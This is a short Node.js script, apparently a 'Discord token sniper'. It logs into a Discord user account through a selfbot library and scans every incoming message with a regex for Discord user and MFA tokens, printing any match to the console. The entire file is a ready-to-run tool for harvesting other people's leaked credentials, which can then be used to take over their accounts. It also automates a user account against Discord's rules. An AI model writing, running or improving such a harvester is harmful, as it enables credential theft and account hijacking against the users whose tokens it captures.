//Dependencies
const Discord = require("discord.js-selfbot-v11")

//Variables
const Self_Args = process.argv.slice(2)

const User = new Discord.Client()

//Main
if(Self_Args.length == 0){
    console.log(`node index.js <discord_token>
Example: node index.js notsofast_yourdiscordtokenhere`)
    process.exit()
}

if(Self_Args[0] == ""){
    console.log("Invalid discord_token.")
    process.exit()
}

User.on("ready", ()=>{
    console.log(`Discord token sniper is running.`)
})

User.on("message", (message)=>{
    const found = message.content.match(/(mfa\.[a-z0-9_-]{20,})|([a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27})/i)

    if(found){
        console.log(`Discord token found: ${found}`)
    }
})

User.login(Self_Args[0])
